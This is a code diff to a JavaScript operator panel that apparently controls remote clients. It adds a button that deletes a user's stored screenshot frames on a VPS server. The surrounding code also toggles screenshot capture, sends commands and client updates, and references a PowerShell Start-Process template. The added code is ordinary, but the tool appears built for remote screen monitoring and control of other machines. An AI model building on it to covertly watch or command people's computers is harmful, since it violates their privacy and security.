@@ -596,6 +596,44 @@ Start-Process $o`;
         }
     }
 
+    async function doDeleteAllScreenshots() {
+        if (isSendingCommand) return;
+        const user = runState.popupUser;
+        if (!user) return;
+        if (!runState.isConnected || user.demo) {
+            alert('Demo mode: action preview only. Connect to send real commands.');
+            return;
+        }
+
+        if (!confirm(`Are you sure you want to delete all screenshot frames for ${user.username}?`)) return;
+
+        const btn = $('delete-screenshots-btn');
+        if (btn) {
+            btn.disabled = true;
+            btn.textContent = 'deleting...';
+        }
+
+        try {
+            const res = await fetch(`${VPS_URL}/api/frames/delete`, {
+                method: 'POST',
+                headers: { 'Content-Type': 'application/json', 'x-password': runState.password },
+                body: JSON.stringify({ username: user.username })
+            });
+            if (!res.ok) throw new Error('Failed to delete frames');
+            if (typeof FramesApp !== 'undefined' && FramesApp.state && FramesApp.state.currentFolder === user.username) {
+                if (typeof FramesApp.resetFramesState === 'function') FramesApp.resetFramesState();
+            }
+            alert(`Successfully deleted all screenshot frames for ${user.username}.`);
+        } catch (e) {
+            alert('Failed to delete screenshots.');
+        } finally {
+            if (btn) {
+                btn.disabled = false;
+                btn.textContent = 'delete screenshots';
+            }
+        }
+    }
+
     // ── Send / fetch ──
     let isSendingCommand = false;
     async function doSendPopup() {
@@ -822,6 +860,7 @@ Start-Process $o`;
         $('upload-btn').onclick = () => $('file-upload').click();
         $('update-client-btn')?.addEventListener('click', doSendUpdateClient);
         $('enable-screenshot-btn')?.addEventListener('click', doToggleEnableScreenshot);
+        $('delete-screenshots-btn')?.addEventListener('click', doDeleteAllScreenshots);
 
         $('file-upload').onchange = e => {
             const file = e.target.files[0]; if (!file) return;
